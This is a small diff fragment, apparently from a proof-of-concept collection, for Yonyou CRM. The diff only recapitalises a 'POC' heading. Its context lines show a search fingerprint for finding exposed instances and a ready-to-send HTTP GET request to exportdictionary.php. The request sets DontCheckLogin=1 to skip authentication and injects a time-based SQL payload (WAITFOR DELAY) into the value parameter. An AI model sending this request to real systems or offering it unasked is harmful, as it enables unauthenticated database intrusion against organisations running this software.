@@ -8,7 +8,7 @@
 app.name="用友 CRM"
 ```
 
-## poc
+## POC
 
 ```java
 GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
